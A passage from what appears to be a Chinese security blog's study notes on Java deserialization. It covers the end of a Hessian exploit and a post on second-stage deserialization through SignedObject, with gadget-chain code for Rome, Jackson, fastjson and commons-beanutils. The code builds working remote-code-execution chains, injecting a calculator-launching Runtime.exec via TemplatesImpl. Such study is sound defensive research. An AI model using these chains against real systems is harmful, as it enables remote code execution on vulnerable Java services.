class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open  -a calculator\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">randomClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;EvilCat&quot;</span>;<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br><br>        <span class="hljs-type">byte</span>[] classBytes = cc.toBytecode();<br>        <span class="hljs-type">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;classBytes&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);<br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,toStringBean);<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>        signature.initSign(privateKey);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(badAttributeValueExpException, privateKey,signature );<br><br><br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">equalsBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(SignedObject.class,signedObject));<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(equalsBean,<span class="hljs-string">&quot;2&quot;</span>);<br><br><br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./hessiantwo&quot;</span>));<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.flushBuffer();<br><br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./hessiantwo&quot;</span>));<br>        hessian2Input.readObject();<br><br><span class="hljs-comment">//        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="hljs-comment">//        ObjectOutputStream outputStream = new ObjectOutputStream(baos);</span><br><span class="hljs-comment">//        outputStream.writeObject(hashMap);</span><br><span class="hljs-comment">//        outputStream.close();</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="hljs-comment">//        ObjectInputStream Input = new ObjectInputStream(bais);</span><br><span class="hljs-comment">//        Input.readObject();</span><br><span class="hljs-comment">//        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./hessian_tostring&quot;));</span><br><span class="hljs-comment">//        outputStream.writeObject(hashMap);</span><br><span class="hljs-comment">//        outputStream.close();</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./hessian_tostring&quot;));</span><br><span class="hljs-comment">//        inputStream.readObject();</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ul><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p><a href="https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html">https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html</a></p><p><a href="https://goodapple.top/archives/1193">https://goodapple.top/archives/1193</a></p><p><a href="https://www.cnblogs.com/LittleHann/p/17818994.html">https://www.cnblogs.com/LittleHann/p/17818994.html</a></p><p><a href="https://www.cnblogs.com/kingbridge/articles/16717030.html">https://www.cnblogs.com/kingbridge/articles/16717030.html</a></p><p><a href="https://su18.org/post/hessian/">https://su18.org/post/hessian/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>java反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二次反序列化学习（一）</title>
    <link href="/2024/01/17/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/01/17/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="二次反序列化学习（一）"><a href="#二次反序列化学习（一）" class="headerlink" title="二次反序列化学习（一）"></a>二次反序列化学习（一）</h2><p>为了更好找到银行驻场，随学习二次反序列化。</p><p><img src="v2-e88049215a67c7ab818b07354e26e58a_xl.jpg" alt="img"></p><h2 id="SignedObject"><a href="#SignedObject" class="headerlink" title="SignedObject"></a>SignedObject</h2><h3 id="0x01-SignedObject分析"><a href="#0x01-SignedObject分析" class="headerlink" title="0x01 SignedObject分析"></a>0x01 SignedObject分析</h3><p>比较简单。可以序列化，fied可控。太完美了，早入行几年就好了。</p><p>java&#x2F;security&#x2F;SignedObject.java#getObject()</p><p><img src="image-20240117020703509.png" alt="image-20240117020703509"></p><p><img src="image-20240117020654623.png" alt="image-20240117020654623"></p><p>可以看到这个从content获取流然后进行反序列化。</p><p><img src="image-20240117020950838.png" alt="image-20240117020950838"></p><p>content是一个byte数组。继承ser。那么无非就是反射赋值，或者构造函数赋值。</p><p><img src="image-20240117021123904.png" alt="image-20240117021123904"></p><p>构造函数pubilc，直接new就完事了，然后触发getObject()就行。很容易想到jackson，fastjson，cb等来触发javabean的getter来进行触发。</p><p>java&#x2F;security&#x2F;Signature.java#Map()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> Map&lt;String,Boolean&gt; signatureInfo;<br><br><span class="hljs-keyword">static</span> &#123;<br>    signatureInfo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;String,Boolean&gt;();<br>    <span class="hljs-type">Boolean</span> <span class="hljs-variable">TRUE</span> <span class="hljs-operator">=</span> Boolean.TRUE;<br>    <span class="hljs-comment">// pre-initialize with values for our SignatureSpi implementations</span><br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.provider.DSA$RawDSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.provider.DSA$SHA1withDSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$MD2withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$MD5withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$SHA1withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$SHA256withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$SHA384withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.rsa.RSASignature$SHA512withRSA&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;com.sun.net.ssl.internal.ssl.RSASignature&quot;</span>, TRUE);<br>    signatureInfo.put(<span class="hljs-string">&quot;sun.security.pkcs11.P11Signature&quot;</span>, TRUE);<br>&#125;<br></code></pre></td></tr></table></figure><p>jdk自带算法</p><p>根据自带算法，构造Signature的构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br><span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br><span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>signature.initSign(privateKey);<br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(templates, privateKey,signature );<br></code></pre></td></tr></table></figure><h3 id="0x02-多种方法触发SignedObject-getObject"><a href="#0x02-多种方法触发SignedObject-getObject" class="headerlink" title="0x02 多种方法触发SignedObject.getObject()"></a>0x02 多种方法触发SignedObject.getObject()</h3><h4 id="一、依赖-hashmap-Rome"><a href="#一、依赖-hashmap-Rome" class="headerlink" title="一、依赖: hashmap-&gt;Rome"></a>一、依赖: hashmap-&gt;Rome</h4><p>因为调用SignedObject.getObject()。所以需要gettset来触发。有很多方法。</p><p>hashmap.readObject()-&gt;hash(key)-&gt;key.hashcode-&gt;Rome.ObjectBean.hashcode()-&gt;EqualsBean.javabeanHashCode()-&gt;ToStringBean.java#toString()-&gt;SignedObject.getObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br><span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br><span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>signature.initSign(privateKey);<br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(SerObj, privateKey,signature );<br><br><span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(SignedObject.class, signedObject);<br><span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class, toStringBean);<br><br>HashMap&lt;Object, Object&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>hashMap1.put(root,<span class="hljs-string">&quot;x&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="二、依赖-BadAttributeValueExpException-Rome"><a href="#二、依赖-BadAttributeValueExpException-Rome" class="headerlink" title="二、依赖: BadAttributeValueExpException-&gt;Rome"></a>二、依赖: BadAttributeValueExpException-&gt;Rome</h4><p>BadAttributeValueExpException.readObject()-&gt;ToStringBean.java#toString()-&gt;SignedObject.getObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br><span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br><span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br><span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>signature.initSign(privateKey);<br><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(SerObj, privateKey,signature );<br><br><span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(SignedObject.class, signedObject);<br><span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>setFieldValue(val1, <span class="hljs-string">&quot;val&quot;</span>, toStringBean);<br></code></pre></td></tr></table></figure><h4 id="三、依赖：jackson"><a href="#三、依赖：jackson" class="headerlink" title="三、依赖：jackson"></a>三、依赖：jackson</h4><p>BadAttributeValueExpException.readObject()-&gt;jackson.databind.node.POJONode.toString()-&gt;om.fasterxml.jackson.databind.node.toString()-&gt;com.fasterxml.jackson.databind.ObjectWriter.writeValueAsString()-&gt;SignedObject.getObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-comment">// 保证能写入序列化数据，利用javassist删除writeReplace()。</span><br><span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool_1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool_1.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        jsonNode.removeMethod(writeReplace);<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>        jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    &#125;<br>    <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>    <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br>    <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>    <span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>    signature.initSign(privateKey);<br>    <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashMap, privateKey,signature );<br><br>    <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(signedObject);<br>    <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>    setFieldValue(val1, <span class="hljs-string">&quot;val&quot;</span>, jsonNodes1);<br></code></pre></td></tr></table></figure><h4 id="四、依赖：fastjson-1-2-48"><a href="#四、依赖：fastjson-1-2-48" class="headerlink" title="四、依赖：fastjson 1.2.48+"></a>四、依赖：fastjson 1.2.48+</h4><p>HashMap.readObject()-&gt;BadAttributeValueExpException.readObject()-&gt;BadAttributeValueExpException.toString()-&gt;<strong>com.alibaba.fastjson.JSONObject.toString()&#x2F;com.alibaba.fastjson.JSONArray.toString()</strong>-&gt;com.alibaba.fastjson.JSON.toString()-&gt;com.alibaba.fastjson.JSON.toJSONString()-&gt;com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;JSONSerializer.java#write()-&gt;com&#x2F;alibaba&#x2F;fastjson&#x2F;serializer&#x2F;ASMSerializerFactory.javacreateJavaBeanSerializer(SerializeBeanInfo beanInfo) -&gt;SignedObject.getObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>        signature.initSign(privateKey);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(SerObj, privateKey,signature );<br>        <br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;222&quot;</span>,signedObject);<br><span class="hljs-comment">//        JSONArray objects = new JSONArray();</span><br><span class="hljs-comment">//        objects.add(signedObject);</span><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val1, <span class="hljs-string">&quot;val&quot;</span>, jsonObject);<br><br>        HashMap&lt;Object, Object&gt; hashMap1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap1.put(signedObject,val1);<br></code></pre></td></tr></table></figure><h4 id="五、依赖：cb"><a href="#五、依赖：cb" class="headerlink" title="五、依赖：cb"></a>五、依赖：cb</h4><p>PriorityQueue.readObect()-&gt; org.apache.commons.beanutils.BeanComparator.compare()-&gt;PropertyUtils.getProperty()-&gt;SignedObject.getObject()-&gt;PropertyUtilsBean.java#getSimpleProperty()-&gt;SignedObject.getObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">keyPairGenerator</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;RSA&quot;</span>);<br>    <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.generateKeyPair();<br>    <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>    <span class="hljs-type">Signature</span> <span class="hljs-variable">signature</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;MD2withRSA&quot;</span>);<br>    signature.initSign(privateKey);<br>    <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(SerObj, privateKey,signature );<br><br>BeanComparator&lt;Object&gt; objectBeanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;();<br>    setFieldValue(objectBeanComparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;object&quot;</span>);<br>    PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(<span class="hljs-number">1</span>);<br><br>    setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,objectBeanComparator);<br>    setFieldValue(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>    Object[] objects = &#123;signedObject, <span class="hljs-number">1</span>&#125;;<br>    setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,objects);<br></code></pre></td></tr></table></figure><h3 id="0x03-完整exp"><a href="#0x03-完整exp" class="headerlink" title="0x03 完整exp"></a>0x03 完整exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.towser;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> 